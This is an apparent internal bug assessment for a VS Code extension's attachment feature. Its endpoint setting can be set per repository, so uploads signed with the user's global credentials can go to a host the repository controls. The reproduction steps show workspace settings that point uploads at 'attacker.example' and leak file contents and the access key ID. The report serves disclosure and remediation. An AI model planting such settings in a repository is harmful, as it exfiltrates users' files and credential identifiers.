# Bug Assessment: object-storage endpoint can be set by the workspace and receives the user's global credentials

- **Slug**: endpoint-setting-scope
- **Created**: 2026-11-01
- **Source**: pasted text
- **Verdict**: valid
- **Severity**: medium

## Report (verbatim or summarized)

> endpoint setting scope

## Symptom

`doorstop.attachments.objectStorage.endpoint` has `"scope": "resource"`, so a repository's `.vscode/settings.json` can set it. The access and secret keys live in VS Code `SecretStorage`, which is per extension and shared across all workspaces. A cloned repo can therefore set `storage: objectStorage`, `thresholdMB: 0`, and an endpoint it controls. The next pasted or dropped file is uploaded there. The request is signed with the user's credentials, so the access key ID travels in the `Authorization` header. The file content and the key ID leak. The secret key itself does not. Expected behavior: where credentials are sent is decided by the user, not by the workspace.

## Reproduction

1. Run "Doorstop: Set Object Storage Credentials" once, in any workspace.
2. Open and trust a repo whose `.vscode/settings.json` sets `doorstop.attachments.storage: "objectStorage"`, `doorstop.attachments.objectStorage.thresholdMB: 0`, and `doorstop.attachments.objectStorage.endpoint: "https://attacker.example"`.
3. Paste an image into an item. The signed PUT goes to attacker.example.

## Suspected Code Paths

- `package.json:309-313`: `endpoint` with `"scope": "resource"`.
- `package.json:327-331`: `publicUrl`, same scope. It only affects generated links, so it is lower risk.
- `src/attachments.ts:188-195`: reads the endpoint from resource-scoped configuration and the keys from global `secrets`.
- `src/attachments.ts:346-347`: stores the credentials once, not per endpoint.

## Root Cause Hypothesis

The setting's scope and the credentials' scope do not match: credentials are per user, but the destination can be set per workspace. Confidence: high. Workspace Trust reduces the risk but does not remove it. The extension declares no `untrustedWorkspaces` capability, so it does not run in Restricted Mode, but trusting a repo is a one-click habit.

## Proposed Remediation

**Preferred**: Change `endpoint` (and `region`, which goes with it) to `"scope": "machine"`. VS Code then reads it only from User and Remote settings and ignores workspace values. `storage`, `thresholdMB`, `bucket`, `prefix`, and `publicUrl` can stay `resource`.

**Alternatives**:

- Keep `resource`, but key the stored credentials by endpoint, so a new endpoint has none and the user must enter them. Workspaces can still choose their storage, but it is more code and changes the "Set Credentials" flow.
- `capabilities.untrustedWorkspaces.restrictedConfigurations`. This only matters for untrusted workspaces, where the extension already does not run, so it does not help.

**Files likely to change**:

- `package.json`
- `README.md`, `CHANGELOG.md` (endpoint is now a user setting)
- an attachments/manifest test in `src/test/`

**Tests to add or update**:

- Manifest test: `doorstop.attachments.objectStorage.endpoint` has scope `machine`.

## Risks & Considerations

- Breaking for anyone with the endpoint in workspace settings. After the change, VS Code ignores that value and uploads report a missing endpoint. Mention it in CHANGELOG. The feature is recent (`6b3353c add object storage`), so few users are affected.

## Open Questions

- [NEEDS CLARIFICATION: is a per-repo endpoint a real requirement (different projects pointing at different storage servers)? If yes, prefer per-endpoint credentials over the scope change.]
